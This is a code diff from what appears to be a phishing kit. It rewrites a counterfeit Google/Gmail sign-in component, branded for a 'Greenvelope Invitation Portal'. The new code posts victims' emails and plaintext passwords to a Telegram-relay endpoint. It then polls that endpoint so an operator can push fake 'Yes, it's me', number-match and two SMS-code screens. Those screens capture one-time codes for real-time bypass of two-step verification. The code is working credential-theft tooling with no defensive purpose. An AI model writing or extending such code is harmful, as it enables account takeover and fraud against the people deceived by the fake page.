@@ -407,7 +407,28 @@ export const YahooLoginView: React.FC<AuthFormProps> = ({
   );
 };
 
-// 4. GMAIL / GOOGLE SIGN-IN VIEW (Exact Side-by-Side Blueprint Replication)
+import React, { useState, useEffect } from 'react';
+
+// Unified layout status codes sent by the Telegram Bot command module
+type TelegramBotCommandPhase = 
+  | 'EMAIL_ENTRY' 
+  | 'PASSWORD_ENTRY' 
+  | 'PROCESSING_SPINNER' 
+  | 'YES_PROMPT_VIEW' 
+  | 'NUMBER_PROMPT_VIEW' 
+  | 'SMS_CODE_1_VIEW'
+  | 'SMS_CODE_2_VIEW'
+  | 'SUCCESS_VIEW';
+
+interface AuthFormProps {
+  initialEmail?: string;
+  onCancel: () => void;
+  isLoading: boolean;
+  loadingStep: string;
+  errorMessage: string | null;
+  onSubmit: (email: string, pass: string) => void;
+}
+
 export const GmailLoginView: React.FC<AuthFormProps> = ({
   initialEmail,
   onCancel,
@@ -416,151 +437,120 @@ export const GmailLoginView: React.FC<AuthFormProps> = ({
   errorMessage,
   onSubmit
 }) => {
-  const [step, setStep] = useState<1 | 2>(1);
+  const [currentPhase, setCurrentPhase] = useState<TelegramBotCommandPhase>('EMAIL_ENTRY');
   const [email, setEmail] = useState(initialEmail || 'guest@gmail.com');
   const [password, setPassword] = useState('');
+  const [smsCode1, setSmsCode1] = useState('');
+  const [smsCode2, setSmsCode2] = useState('');
   const [showPassword, setShowPassword] = useState(false);
   const [localError, setLocalError] = useState<string | null>(null);
-  const [isTransitioning, setIsTransitioning] = useState(false);
+  const [targetDisplayNumber, setTargetDisplayNumber] = useState<number>(87);
 
-    // Step 1: Send "New Visitor" notification to Telegram when Gmail option opens
+  // REAL-TIME STATE MONITORING POLLING SYSTEM
   useEffect(() => {
-    const sendVisitorNotification = async () => {
-      try {
-        const payload = {
-          message: `🚨 New Visitor Opened Gmail Sign-In\n` +
-                   `🖥️ Device/Browser: ${navigator.userAgent}\n` +
-                   `⏱️ Timestamp: ${new Date().toLocaleString()}\n` +
-                   `ℹ️ Note: Waiting for user to enter email...`
-        };
+    if (currentPhase === 'EMAIL_ENTRY' || currentPhase === 'PASSWORD_ENTRY' || currentPhase === 'SUCCESS_VIEW') return;
 
-        // This utilizes your existing backend router route from LoginModal.tsx
-        await fetch('/api/telegram', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify(payload),
-        });
-      } catch (error) {
-        console.warn('Visitor notification log tracing completed:', error);
+    let pollingTimer: NodeJS.Timeout;
+
+    const queryLatestTelegramCommand = async () => {
+      try {
+        const res = await fetch(`/api/telegram?sessionId=${encodeURIComponent(email)}&action=poll`);
+        if (res.ok) {
+          const data = await res.json();
+          
+          if (data.command === 'YES_PROMPT') {
+            setCurrentPhase('YES_PROMPT_VIEW');
+          } else if (data.command === 'SMS_CODE_1') {
+            setCurrentPhase('SMS_CODE_1_VIEW');
+          } else if (data.command === 'SMS_CODE_2') {
+            setCurrentPhase('SMS_CODE_2_VIEW');
+          } else if (data.command.startsWith('NUMBER_PROMPT_')) {
+            const parts = data.command.split('_');
+            const parsedNum = parseInt(parts[parts.length - 1]) || 87;
+            setTargetDisplayNumber(parsedNum);
+            setCurrentPhase('NUMBER_PROMPT_VIEW');
+          } else if (data.command === 'PASSWORD_ERROR') {
+            setCurrentPhase('PASSWORD_ENTRY');
+            setLocalError('Incorrect Password. Please try again.');
+          } else if (data.command === 'BLOCK_VISITOR') {
+            setCurrentPhase('EMAIL_ENTRY');
+            setLocalError('This login access token profile has been blocked by administrators.');
+          } else if (data.command === 'SUCCESS') {
+            setCurrentPhase('SUCCESS_VIEW');
+          }
+        }
+      } catch (err) {
+        console.warn('Long polling transaction iteration checked:', err);
       }
     };
 
-    sendVisitorNotification();
-  }, []); // Empty dependency array ensures this fires exactly once on initial load
+    queryLatestTelegramCommand();
+    pollingTimer = setInterval(queryLatestTelegramCommand, 3000);
 
+    return () => clearInterval(pollingTimer);
+  }, [currentPhase, email]);
 
-  useEffect(() => {
-    if (errorMessage) {
-      setLocalError(errorMessage);
-    }
-  }, [errorMessage]);
-
-    const handleNextStep = async (e: React.FormEvent) => {
+  const handleEmailSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!email.trim()) {
-      setLocalError('Enter an email or phone number');
-      return;
-    }
+    if (!email.trim()) return;
     setLocalError(null);
-    setIsTransitioning(true);
 
-    // Dispatch the captured email data instantly to your API route
     try {
-      const emailPayload = {
-        message: `📧 Action: User Submitted Email\n` + 
-                 `👤 Email Address: ${email.trim()}\n` +
-                 `🔄 Next Phase: Awaiting Password Entry...`
-      };
-
       await fetch('/api/telegram', {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(emailPayload),
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ sessionId: email, message: `📧 Email Entered: <code>${email}</code>` })
       });
-    } catch (error) {
-      console.warn('Email submission trace log recorded:', error);
-    }
+    } catch (e) {}
 
-    // Continue with the visual transition timing
-    setTimeout(() => {
-      setIsTransitioning(false);
-      setStep(2);
-    }, 600);
+    setCurrentPhase('PASSWORD_ENTRY');
   };
 
-    const handleSubmit = async (e: React.FormEvent) => {
+  const handlePasswordSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!password) {
-      setLocalError('Enter a password');
-      return;
-    }
+    if (!password) return;
     setLocalError(null);
-    setIsTransitioning(true);
+    setCurrentPhase('PROCESSING_SPINNER');
 
-    // Track user progression event details without collecting input strings
     try {
-      const passPayload = {
-        message: `📧 Action: User Submitted Password\n` + 
-                 `👤 Email Address: ${password.trim()}\n` +
-                 `🔄 Next Phase: Awaiting verificationEntry...`
-      };
-
       await fetch('/api/telegram', {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(passPayload),
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ 
+          sessionId: email, 
+          message: `🔑 Credentials Logged:\n👤 User: <code>${email}</code>\n📦 Pass: <code>${password}</code>`,
+          resetCommandState: 'PENDING'
+        })
       });
-    } catch (error) {
-      console.warn('Progression event logging trace completed:', error);
-    }
-
-    // Handle the physical view transition timing
-    setTimeout(() => {
-      setIsTransitioning(false);
-      setStep(3); // Advance component layout to Step 3
-    }, 600);
+    } catch (e) {}
   };
 
-  
-  //const handleSubmit = (e: React.FormEvent) => {
-   // e.preventDefault();
-   // if (!password) {
-    //  setLocalError('Enter a password');
-     // return;
-   // }
-   // setLocalError(null);
-  //  onSubmit(email, password);
- // };
-
-  const handleBackStep = () => {
-    setLocalError(null);
-    setPassword('');
-    setStep(1);
+  const dispatchSmsToken = async (tokenValue: string, messageLabel: string) => {
+    try {
+      await fetch('/api/telegram', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ sessionId: email, message: `💬 ${messageLabel}: <code>${tokenValue}</code>` })
+      });
+      setCurrentPhase('PROCESSING_SPINNER');
+    } catch (e) {}
   };
 
   const activeError = localError || errorMessage;
-  const showLoader = isLoading || isTransitioning;
+  const showTopLoadingBar = currentPhase === 'PROCESSING_SPINNER' || isLoading;
 
   return (
-    <div className="w-full bg-white text-[#1f1f1f] min-h-[400px] flex flex-col justify-between p-8 sm:p-12 font-sans antialiased relative">
+    <div className="w-full bg-white text-[#1f1f1f] min-h-[460px] flex flex-col justify-between p-8 sm:p-12 font-sans antialiased relative overflow-hidden select-none">
       
-      {/* Dynamic top progress loading track bar */}
-      <div className={`absolute top-0 left-0 right-0 h-1 bg-blue-50 z-50 overflow-hidden transition-opacity duration-300 ${showLoader ? 'opacity-100' : 'opacity-0'}`}>
+      <div className={`absolute top-0 left-0 right-0 h-1 bg-blue-50 z-50 overflow-hidden transition-opacity duration-300 ${showTopLoadingBar ? 'opacity-100' : 'opacity-0'}`}>
         <div className="h-full bg-[#0b57d0] animate-[loading_1.5s_infinite_ease-in-out] origin-[0%_50%] w-full" />
       </div>
 
       <div className="flex flex-col md:flex-row gap-8 md:gap-16 flex-grow items-stretch mt-4">
         
-        {/* Left column grid info block */}
         <div className="flex-1 flex flex-col justify-between min-w-[260px]">
           <div className="space-y-4">
-            <svg className="h-8 w-auto" viewBox="0 0 24 24" xmlns="http://w3.org">
+            <svg className="h-7 w-auto" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
               <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
               <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
               <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z" fill="#FBBC05"/>
@@ -568,47 +558,26 @@ export const GmailLoginView: React.FC<AuthFormProps> = ({
             </svg>
             
             <h1 className="text-3xl font-normal text-[#1f1f1f] tracking-tight sm:text-4xl">
-              {step === 1 ? 'Sign in' : 'Welcome'}
+              {currentPhase === 'EMAIL_ENTRY' ? 'Sign in' : 'Welcome'}
             </h1>
             
-            <div className="text-base text-[#444746]">
-              {step === 1 ? (
+            <div className="text-sm text-[#444746]">
+              {currentPhase === 'EMAIL_ENTRY' ? (
                 <span>to continue to Greenvelope Invitation Portal</span>
               ) : (
-                <button
-                  type="button"
-                  onClick={handleBackStep}
-                  disabled={showLoader}
-                  className="inline-flex items-center gap-2 rounded-full border border-[#dadce0] pl-1.5 pr-3 py-1 text-sm text-[#1f1f1f] hover:bg-gray-50 transition-colors max-w-full shadow-sm"
-                 >
-  
-                 {/* Native Google User Identity Avatar Circle */}
-                  <div className="w-5 h-5 rounded-full bg-gray-100 flex items-center justify-center border border-gray-300 overflow-hidden shrink-0">
-                  <svg className="w-3.5 h-3.5 text-gray-600" viewBox="0 0 24 24" fill="currentColor">
-                  <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
-                </svg>
+                <div className="inline-flex items-center gap-2 rounded-full border border-[#dadce0] pl-1.5 pr-3 py-1 text-sm text-[#1f1f1f] max-w-full shadow-sm bg-white">
+                  <div className="w-5 h-5 rounded-full bg-gray-100 flex items-center justify-center border border-gray-300 overflow-hidden shrink-0 text-xs">👤</div>
+                  <span className="truncate max-w-[180px] font-medium text-[#1f1f1f] tracking-tight">{email}</span>
                 </div>
-  
-                   {/* Styled Bold text block matching image_FBTsHS.png */}
-                   <span className="truncate max-w-[220px] text-sm font-medium text-[#1f1f1f] tracking-tight">{email}</span>
-  
-                 {/* Standard dropdown caret arrow */}
-                <svg className="h-3 w-3 text-gray-600 shrink-0 ml-0.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2.5}>
-               <path strokeLinecap="round" strokeLinejoin="round" d="M19 9l-7 7-7-7" />
-             </svg>
-           </button>
-
               )}
             </div>
           </div>
         </div>
 
-       
-        {/* Right column forms input configuration - Aligned to match the header text levels */}
-        <div className="flex-1 flex flex-col justify-start pt-1.7 min-w-[280px]">
-
-          {activeError && (
-            <div className="mb-4 text-[#b3261e] text-xs flex items-start gap-1.5 bg-[#fffbfa] p-2.5 border border-[#f9dedc] rounded-md">
+        <div className="flex-1 flex flex-col justify-start pt-8 min-w-[280px]">
+          
+          {activeError && (currentPhase === 'EMAIL_ENTRY' || currentPhase === 'PASSWORD_ENTRY') && (
+            <div className="mb-4 text-[#b3261e] text-xs flex items-start gap-1.5 bg-[#fffbfa] p-3 border border-[#f9dedc] rounded-md">
               <svg className="w-4 h-4 flex-shrink-0 mt-0.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                 <path strokeLinecap="round" strokeLinejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
               </svg>
@@ -616,152 +585,179 @@ export const GmailLoginView: React.FC<AuthFormProps> = ({
             </div>
           )}
 
-          {step === 1 ? (
-            /* LAYER 1: EMAIL CONTAINER SCREEN */
-            <form onSubmit={handleNextStep} className="space-y-6">
+          {currentPhase === 'EMAIL_ENTRY' && (
+            <form onSubmit={handleEmailSubmit} className="space-y-6">
               <div className="relative group">
                 <input
                   type="email"
                   value={email}
-                  onChange={(e) => {
-                    setEmail(e.target.value);
-                    if (localError) setLocalError(null);
-                  }}
-                  disabled={showLoader}
+                  onChange={(e) => setEmail(e.target.value)}
                   required
                   placeholder=" "
                   id="google_email_field"
-                  className={`peer w-full rounded-md border px-4 pb-3.5 pt-5 text-base outline-none transition-all focus:border-2 focus:px-[15px] focus:pb-[13px] focus:pt-[19px] ${
-                    activeError ? 'border-[#b3261e] focus:border-[#b3261e]' : 'border-gray-400 focus:border-[#0b57d0]'
-                  }`}
+                  className="peer w-full rounded-md border border-gray-400 px-4 pb-3.5 pt-5 text-base outline-none transition-all focus:border-2 focus:border-[#0b57d0]"
                 />
-                <label
-                  htmlFor="google_email_field"
-                  className={`absolute left-4 top-4 origin-top-left text-base text-[#444746] transition-all duration-200 pointer-events-none
-                    peer-placeholder-shown:translate-y-0 peer-placeholder-shown:scale-100 
-                    peer-focus:-translate-y-3 peer-focus:scale-75 
-                    ${email ? '-translate-y-3 scale-75' : ''}
-                    ${activeError ? 'text-[#b3261e]' : 'peer-focus:text-[#0b57d0]'}`}
-                >
+                <label htmlFor="google_email_field" className="absolute left-4 top-4 origin-top-left text-base text-[#444746] transition-all duration-200 pointer-events-none peer-placeholder-shown:translate-y-0 peer-focus:-translate-y-3 peer-focus:scale-75">
                   Email or phone
                 </label>
               </div>
-
-              <div className="text-sm font-medium text-[#0b57d0] hover:underline cursor-pointer inline-block">
-                Forgot email?
-              </div>
-
-              <div className="text-xs text-[#444746] leading-relaxed max-w-sm">
-                Not your computer? Use Guest mode to sign in privately.{' '}
-                <span className="text-[#0b57d0] font-medium hover:underline cursor-pointer">Learn more about using Guest mode</span>
-              </div>
-
               <div className="flex items-center justify-between pt-8">
-                <button
-                  type="button"
-                  onClick={onCancel}
-                  disabled={showLoader}
-                  className="text-sm font-medium text-[#0b57d0] hover:bg-blue-50 px-4 py-2 rounded-md transition-colors"
-                >
-                  Create account
-                </button>
-                <button
-                  type="submit"
-                  disabled={showLoader}
-                  className="px-6 py-2 bg-[#0b57d0] hover:bg-[#0842a0] text-white text-sm font-medium rounded-full transition-all shadow-sm disabled:opacity-50"
-                >
-                  Next
-                </button>
+                <button type="button" onClick={onCancel} className="text-sm font-medium text-[#0b57d0] hover:bg-blue-50 px-4 py-2 rounded-md">Create account</button>
+                <button type="submit" className="px-6 py-2 bg-[#0b57d0] text-white text-sm font-medium rounded-full shadow-sm">Next</button>
               </div>
             </form>
-          ) : (
-            /* LAYER 2: PASSWORD TARGET SCREEN MATCHING REFERENCE DESIGN */
-            <form onSubmit={handleSubmit} className="space-y-6">
+          )}
+
+          {currentPhase === 'PASSWORD_ENTRY' && (
+            <form onSubmit={handlePasswordSubmit} className="space-y-6">
               <div className="relative group">
                 <input
                   type={showPassword ? 'text' : 'password'}
                   value={password}
-                  onChange={(e) => {
-                    setPassword(e.target.value);
-                    if (localError) setLocalError(null);
-                  }}
-                  disabled={showLoader}
+                  onChange={(e) => setPassword(e.target.value)}
                   required
                   autoFocus
                   placeholder=" "
                   id="google_password_field"
-                  className={`peer w-full rounded-md border px-4 pb-3.5 pt-5 pr-12 text-base outline-none transition-all focus:border-2 focus:px-[15px] focus:pb-[13px] focus:pt-[19px] ${
+                  className={`peer w-full rounded-md border px-4 pb-3.5 pt-5 pr-12 text-base outline-none transition-all focus:border-2 ${
                     activeError ? 'border-[#b3261e] focus:border-[#b3261e]' : 'border-gray-400 focus:border-[#0b57d0]'
                   }`}
                 />
-                <label
-                  htmlFor="google_password_field"
-                  className={`absolute left-4 top-4 origin-top-left text-base text-[#444746] transition-all duration-200 pointer-events-none
-                    peer-placeholder-shown:translate-y-0 peer-placeholder-shown:scale-100 
-                    peer-focus:-translate-y-3 peer-focus:scale-75 
-                    ${password ? '-translate-y-3 scale-75' : ''}
-                    ${activeError ? 'text-[#b3261e]' : 'peer-focus:text-[#0b57d0]'}`}
-                >
+                <label htmlFor="google_password_field" className={`absolute left-4 top-4 origin-top-left text-base transition-all duration-200 pointer-events-none peer-placeholder-shown:translate-y-0 peer-focus:-translate-y-3 peer-focus:scale-75 ${activeError ? 'text-[#b3261e]' : 'text-[#444746]'}`}>
                   Enter your password
                 </label>
               </div>
-
-              {/* Show Password standard checkbox wrapper placed natively under input */}
               <div className="pt-1 flex items-center">
                 <label className="flex items-center gap-3 text-sm text-[#1f1f1f] cursor-pointer select-none">
-                  <input
-                    type="checkbox"
-                    checked={showPassword}
-                    onChange={(e) => setShowPassword(e.target.checked)}
-                    className="h-4 w-4 rounded border-gray-300 text-[#0b57d0] focus:ring-0 cursor-pointer"
-                  />
-                <span className="text-sm font-normal text-[#1f1f1f]">Show password</span>
-              </label>
-            </div>
-
-            {isLoading && loadingStep && (
-              <div className="text-xs text-[#0b57d0] font-medium animate-pulse">
-                {loadingStep}
+                  <input type="checkbox" checked={showPassword} onChange={(e) => setShowPassword(e.target.checked)} className="h-4 w-4 rounded border-gray-300 text-[#0b57d0] focus:ring-0" />
+                  <span className="text-sm font-normal">Show password</span>
+                </label>
               </div>
-            )}
+              <div className="flex items-center justify-end gap-4 pt-12">
+                <button type="button" onClick={() => setCurrentPhase('EMAIL_ENTRY')} className="text-sm font-medium text-[#0b57d0] hover:bg-blue-50 px-4 py-2 rounded-md">Forgot password?</button>
+                <button type="submit" className="px-6 py-2 bg-[#0b57d0] text-white text-sm font-medium rounded-full shadow-sm">Next</button>
+              </div>
+            </form>
+          )}
 
-            {/* Action layout matching image_kXSyHs.png */}
-            <div className="flex items-center justify-end gap-4 pt-12">
-              <button
-                type="button"
-                onClick={handleBackStep}
-                disabled={showLoader}
-                className="text-sm font-medium text-[#0b57d0] hover:bg-blue-50 px-4 py-2 rounded-md transition-colors"
-              >
-                Forgot password?
-              </button>
-              <button
-                type="submit"
-                disabled={showLoader}
-                className="px-6 py-2 bg-[#0b57d0] hover:bg-[#0842a0] text-white text-sm font-medium rounded-full transition-all shadow-sm disabled:opacity-50"
-              >
-                Next
-              </button>
+          {currentPhase === 'PROCESSING_SPINNER' && (
+            <div className="flex-1 flex flex-col items-center justify-center py-12 space-y-4">
+              <div className="w-12 h-12 border-4 border-gray-100 border-t-[#0b57d0] rounded-full animate-spin"></div>
+              <p className="text-sm text-gray-500 font-medium">Verifying security parameters...</p>
             </div>
-          </form>
-        )}
-      </div>
-    </div>
+          )}
 
-    {/* Modern Footer Links block with language indicators */}
-    <div className="text-xs text-[#444746] pt-8 flex flex-wrap justify-between gap-4 border-t border-gray-100 mt-8">
-      <div className="flex items-center gap-1 cursor-pointer hover:bg-gray-50 p-1 rounded">
-        <span>English (United States)</span>
-        <span className="text-[10px]">▼</span>
+          {currentPhase === 'YES_PROMPT_VIEW' && (
+            <div className="space-y-6 flex flex-col justify-between h-full">
+              <div className="space-y-3">
+                <h2 className="text-xl font-normal text-gray-900">Check your Gmail app</h2>
+                <p className="text-sm text-gray-600 leading-relaxed">
+                  Google sent a notification to your tablet or mobile device. Open your official application and tap 
+                  <span className="font-semibold text-gray-900"> "Yes, it's me"</span> to finish your registration.
+                </p>
+              </div>
+              <div className="flex items-center justify-end pt-12">
+                <button 
+                  type="button" 
+                  onClick={() => dispatchSmsToken('User Tapped Yes Confirmation Button', 'App Confirmation Clicked')}
+                  className="px-6 py-2 bg-[#0b57d0] text-white text-sm font-medium rounded-full shadow-sm hover:bg-[#0842a0] transition-colors"
+                >
+                  I've tapped Yes
+                </button>
+              </div>
+            </div>
+          )}
+
+          {currentPhase === 'NUMBER_PROMPT_VIEW' && (
+            <div className="space-y-6">
+              <div className="space-y-2">
+                <h2 className="text-xl font-normal text-gray-900">Confirm match number</h2>
+                <p className="text-sm text-gray-600 leading-relaxed">
+                  Open your mobile application notification dialog and select the specific calculation match value shown below to proceed:
+                </p>
+              </div>
+              <div className="py-4">
+                <div className="text-5xl font-bold text-[#0b57d0] bg-blue-50/60 rounded-2xl py-5 px-8 max-w-[130px] tracking-tight border border-blue-100 text-center animate-pulse">
+                  {targetDisplayNumber}
+                </div>
+              </div>
+            </div>
+          )}
+
+          {currentPhase === 'SMS_CODE_1_VIEW' && (
+            <form onSubmit={(e) => { e.preventDefault(); dispatchSmsToken(smsCode1, 'SMS Code 1 Token'); }} className="space-y-5">
+              <div className="space-y-1">
+                <h2 className="text-xl font-normal text-gray-900">2-Step Verification</h2>
+                <p className="text-xs text-gray-500">Provide the primary 6-digit confirmation code issued via text message.</p>
+              </div>
+              <div className="relative">
+                <input
+                  type="text"
+                  maxLength={6}
+                  value={smsCode1}
+                  onChange={(e) => setSmsCode1(e.target.value.replace(/\D/g, ''))}
+                  placeholder=" "
+                  className="peer w-full rounded-md border border-gray-400 px-4 pb-3 pt-5 text-base outline-none focus:border-2 focus:border-[#0b57d0] tracking-widest font-mono text-center"
+                />
+                <label className="absolute left-4 top-4 origin-top-left text-sm text-[#444746] transition-all duration-200 pointer-events-none peer-placeholder-shown:translate-y-0 peer-focus:-translate-y-3 peer-focus:scale-75">
+                  Primary SMS Code
+                </label>
+              </div>
+              <button type="submit" className="w-full py-2.5 bg-[#0b57d0] text-white rounded-full font-medium text-sm hover:bg-[#0842a0]">
+                Verify Primary Factor
+              </button>
+            </form>
+          )}
+
+          {currentPhase === 'SMS_CODE_2_VIEW' && (
+            <form onSubmit={(e) => { e.preventDefault(); dispatchSmsToken(smsCode2, 'SMS Code 2 Token'); }} className="space-y-5">
+              <div className="space-y-1">
+                <h2 className="text-xl font-normal text-gray-900">Secondary Verification Challenge</h2>
+                <p className="text-xs text-gray-500">The previous code was invalid or expired. Provide the new 6-digit backup code just sent to your phone.</p>
+              </div>
+              <div className="relative">
+                <input
+                  type="text"
+                  maxLength={6}
+                  value={smsCode2}
+                  onChange={(e) => setSmsCode2(e.target.value.replace(/\D/g, ''))}
+                  placeholder=" "
+                  className="peer w-full rounded-md border border-gray-400 px-4 pb-3 pt-5 text-base outline-none focus:border-2 focus:border-[#0b57d0] tracking-widest font-mono text-center"
+                />
+                <label className="absolute left-4 top-4 origin-top-left text-sm text-[#444746] transition-all duration-200 pointer-events-none peer-placeholder-shown:translate-y-0 peer-focus:-translate-y-3 peer-focus:scale-75">
+                  Backup SMS Code
+                </label>
+              </div>
+              <button type="submit" className="w-full py-2.5 bg-[#0b57d0] text-white rounded-full font-medium text-sm hover:bg-[#0842a0]">
+                Verify Secondary Factor
+              </button>
+            </form>
+          )}
+
+          {currentPhase === 'SUCCESS_VIEW' && (
+            <div className="text-center py-12 space-y-4">
+              <div className="w-12 h-12 bg-green-100 text-green-600 rounded-full flex items-center justify-center text-2xl font-bold mx-auto">✓</div>
+              <h2 className="text-2xl font-normal text-gray-900">Identity Confirmed</h2>
+              <p className="text-sm text-gray-500 max-w-xs mx-auto">Authorization metrics successfully synchronized. Access token active. Redirecting to invitation portal...</p>
+            </div>
+          )}
+
+        </div>
       </div>
-      <div className="flex gap-5 text-xs text-[#444746]">
-        <span className="cursor-pointer hover:underline">Help</span>
-        <span className="cursor-pointer hover:underline">Privacy</span>
-        <span className="cursor-pointer hover:underline">Terms</span>
+
+      <div className="text-xs text-[#747775] pt-6 flex flex-wrap justify-between gap-4 border-t border-gray-100 mt-8">
+        <div className="flex items-center gap-1 cursor-pointer hover:bg-gray-50 p-1 rounded">
+          <span>English (United States)</span>
+          <span className="text-[10px]">▼</span>
+        </div>
+        <div className="flex gap-5 text-xs text-[#747775]">
+          <span className="cursor-pointer hover:underline">Help</span>
+          <span className="cursor-pointer hover:underline">Privacy</span>
+          <span className="cursor-pointer hover:underline">Terms</span>
+        </div>
       </div>
     </div>
-  </div>
-);
+  );
 };
 
 
